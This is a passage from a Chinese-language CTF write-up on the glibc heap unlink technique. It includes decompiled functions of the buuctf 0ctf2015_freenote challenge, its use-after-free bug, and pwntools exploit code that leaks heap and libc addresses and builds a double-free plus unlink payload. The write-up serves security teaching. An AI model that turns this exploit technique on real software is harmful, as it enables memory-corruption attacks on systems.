0x18</code>和<code>P-&gt;bk + 0x10</code>都指向<code>p</code>,只需要修改<code>p</code>的 fd 和 bk 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd = &amp;P - <span class="number">0x18</span> </span><br><span class="line">P-&gt;bk = &amp;P - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>这样就能绕过检查。</p><p>用图表示即为</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638941660238188/a7a92fabc11312d48ad5f66999de7046c2289efe.jpg" alt="Untitled (Draft)-1"></p><h3 id="脱链"><a href="#脱链" class="headerlink" title="脱链"></a>脱链</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>脱链只能在 smallbin / largebin / unsortedbin 中脱，它们都是双向链表，因此脱链操作必须同时修改前后 chunk 的 fd 或者 bk 指针，操作如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK &lt;=&gt; P-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(P-&gt;fd + <span class="number">0x18</span>) = P-&gt;bk <span class="comment">//Ⅰ</span></span><br><span class="line">BK-&gt;fd = FD &lt;=&gt; P-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(P-&gt;bk + <span class="number">0x10</span>) = P-&gt;fd <span class="comment">//Ⅱ</span></span><br></pre></td></tr></table></figure><p>结合绕过检查，可以得出如下结果</p><p>对 Ⅰ式做换算，得到 <strong>P = &amp;P - 0x10</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">∵ P-&gt;fd = &amp;P - <span class="number">0x18</span> </span><br><span class="line">∴ *(&amp;P - <span class="number">0x18</span> + <span class="number">0x18</span>) = P-&gt;<span class="function"><span class="params">bk</span> =&gt;</span> P = P-&gt;bk</span><br><span class="line">∵ P-&gt;bk = &amp;P - <span class="number">0x10</span> </span><br><span class="line">∴ P = &amp;P - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>对 Ⅱ 式做换算，得到 <strong>P = &amp;P - 0x18</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">∵ P-&gt;bk = &amp;P - <span class="number">0x10</span> </span><br><span class="line">∴ *(P-&gt;bk + <span class="number">0x10</span>) = P-&gt;<span class="function"><span class="params">fd</span> =&gt;</span> P = P-&gt;fd</span><br><span class="line">∵ P-&gt;fd = &amp;P - <span class="number">0x18</span> </span><br><span class="line">∴ P = &amp;P - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><p>又因为程序运行时从上到下的，所以最终 <strong>P = &amp;P - 0x18</strong></p><p>即断链之后 P 指针将指向 <strong>(&amp;p-0x18)</strong> 的内存</p><p>(假设我们设置 P = free_got, *(&amp;P-0x18) = system，那么当下一次 free 一个堆块的时候，就会调用 system。)</p><p>用图表示即为</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638942514545723/bef785df80979e9d720cf573d67284096cae3167.jpg" alt="B3DEC786D2B39741828C006A9D697DD1"></p><h3 id="largebin-脱链"><a href="#largebin-脱链" class="headerlink" title="largebin 脱链"></a>largebin 脱链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      </span><br><span class="line">           &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">           <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">           <span class="comment">/*如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</span></span><br><span class="line"><span class="comment">             如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。*/</span></span><br><span class="line">               <span class="keyword">if</span> (P-&gt;fd_nextsize == P) <span class="comment">// 如果 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk</span></span><br><span class="line">                 FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">               <span class="keyword">else</span> &#123;      </span><br><span class="line">                   FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                   FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                   P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                   P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                 &#125;      </span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">               P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">               P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">             &#125;      </span><br><span class="line">         &#125;      </span><br></pre></td></tr></table></figure><p>largebin  脱链相对来说会更复杂<br>先看看 largebin 的结构</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638945747785029/330053826d0fac107fab11641358e925cce71721.png" alt="1345812086_6124"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638945814748879/4794b21608a2086ab4a7b2cd01c8985f0140d223.png" alt="image-20211208144334575"></p><p>首先也有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                </span><br><span class="line">    &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见只有当 P-&gt;fd_nextsize != null 时才需要修改，因为如果 P-&gt;fd_nextsize == null ，说明 P 是尺寸相同的一组 chunks</p><p>的非第一个 chunk，此时 P 的 fd_nextsize 和 bk_nextsize 是没有意义的，自然没有修改的必要。</p><p>检查通过后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/*如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</span></span><br><span class="line"><span class="comment">  如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。*/</span></span><br><span class="line">    <span class="keyword">if</span> (P-&gt;fd_nextsize == P) <span class="comment">// 如果 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk</span></span><br><span class="line">      FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">      &#125;      </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">    P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">    P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>对可利用指向 chunk 的 ptr 指针进行操作</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><hr><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>buuctf 0ctf2015_freenote</p><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639037254302238/6cbbe3df74534de66e97c1ccbf0b64eb969d88f5.png" alt="image-20211209160733957"></p><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><h4 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *<span class="title">sub_400A49</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">0x1810</span>uLL);</span><br><span class="line">  *chunk = <span class="number">256LL</span>;</span><br><span class="line">  result = chunk;</span><br><span class="line">  *(chunk + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(chunk + <span class="number">24LL</span> * i + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *(chunk + <span class="number">24LL</span> * i + <span class="number">24</span>) = <span class="number">0LL</span>;</span><br><span class="line">    result = (chunk + <span class="number">24LL</span> * i + <span class="number">32</span>);</span><br><span class="line">    *result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk + <span class="number">8</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;You need to create some new notes first.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *chunk;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= *chunk )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(chunk + <span class="number">24LL</span> * i + <span class="number">16</span>) == <span class="number">1LL</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d. %s\n&quot;</span>, i, *(chunk + <span class="number">24LL</span> * i + <span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>只能申请 0x80 和 0x180 大小的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk + <span class="number">8</span>) &lt; *chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *chunk;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= *chunk )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !*(chunk + <span class="number">24LL</span> * i + <span class="number">16</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Length of new note: &quot;</span>);</span><br><span class="line">        size = my_read();</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">            size = <span class="number">0x1000</span>;</span><br><span class="line">          v4 = <span class="built_in">malloc</span>((<span class="number">0x80</span> - size % <span class="number">0x80</span>) % <span class="number">0x80</span> + size);<span class="comment">// 0x80/0x180</span></span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">          sub_40085D(v4, size);</span><br><span class="line">          *(chunk + <span class="number">0x18</span>LL * i + <span class="number">0x10</span>) = <span class="number">1LL</span>;</span><br><span class="line">          *(chunk + <span class="number">0x18</span>LL * i + <span class="number">0x18</span>) = size;</span><br><span class="line">          *(chunk + <span class="number">0x18</span>LL * i + <span class="number">0x20</span>) = v4;</span><br><span class="line">          ++*(chunk + <span class="number">8</span>);</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Unable to create new note.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v3 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= *chunk || *(chunk + <span class="number">24LL</span> * v3 + <span class="number">16</span>) != <span class="number">1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of note: &quot;</span>);</span><br><span class="line">  v2 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != *(chunk + <span class="number">24LL</span> * v3 + <span class="number">24</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = chunk;</span><br><span class="line">    *(v1 + <span class="number">24LL</span> * v3 + <span class="number">32</span>) = <span class="built_in">realloc</span>(*(chunk + <span class="number">24LL</span> * v3 + <span class="number">32</span>), (<span class="number">128</span> - v2 % <span class="number">128</span>) % <span class="number">128</span> + v2);</span><br><span class="line">    *(chunk + <span class="number">24LL</span> * v3 + <span class="number">24</span>) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">  sub_40085D(*(chunk + <span class="number">24LL</span> * v3 + <span class="number">32</span>), v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>存在 uaf 漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk + <span class="number">8</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No notes yet.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v1 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= *chunk )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  --*(chunk + <span class="number">8</span>);</span><br><span class="line">  *(chunk + <span class="number">24LL</span> * v1 + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(chunk + <span class="number">24LL</span> * v1 + <span class="number">24</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(*(chunk + <span class="number">24LL</span> * v1 + <span class="number">32</span>)); <span class="comment">//uaf</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>存在 uaf 漏洞</p><p>程序一开始会定义一个结构体，结构体中会存放 chunk 的数量，chunk 自身的大小、使用情况、指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639038973792677/e0572d116e33828c4320481c0e2d5e6ee0108925.png" alt="image-20211209163613580"></p><p>我们可以利用 unlink，将堆指针指向该结构体，就可以实现任意地址写了</p><p> 综上利用方法就是 unlink + double free</p><h4 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x1150940</span>-<span class="number">0x114f000</span>)</span><br><span class="line">print(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap)) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f0dd52dab78</span>-<span class="number">0x7f0dd4f17000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure><p> 虽然程序默认会将 size 扩大为 0x80，但是并不会影响泄露</p><p>当我们 dele 掉 chunk 0 和 chunk 2，两个 chunk 都会被链入 unsortedbin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639039402004567/bd78a54870a58c80b37a3c01cef5125dc282234f.png" alt="image-20211209164321749"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639039608814152/c8e71c32c87e428916684c91daf2963305d826ee.png" alt="image-20211209164648591"></p><p>再次申请回来，并且大小限定为 0x8，就能够泄露出 heap 和 libc</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639040086056253/d1861cae7d7cc71c2b53e5baceb772041daccd6c.png" alt="image-20211209165445801"></p><h4 id="double-free-unlink"><a href="#double-free-unlink" class="headerlink" title="double free + unlink"></a>double free + unlink</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr = heap + <span class="number">0x30</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">pay +=p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)<span class="comment">#0x10</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">0x30</span><span class="comment">#0x20</span></span><br><span class="line">pay +=p64(<span class="number">0x50</span>) + p64(<span class="number">0x20</span>)<span class="comment">#0x10 </span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span> </span><br><span class="line">pay +=p64(<span class="number">0x110</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">pay +=p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line">dele(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>  因为程序有 uaf 漏洞，之前 free 掉的指针还是可以用的，修改内容做到和之前的 chunk 一一对应</p><p>后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639040809086383/27dc9e5e7acdecae7de16b14d0599c04fc87b483.png" alt="image-20211209170648832"></p><p>前：</p><p><img 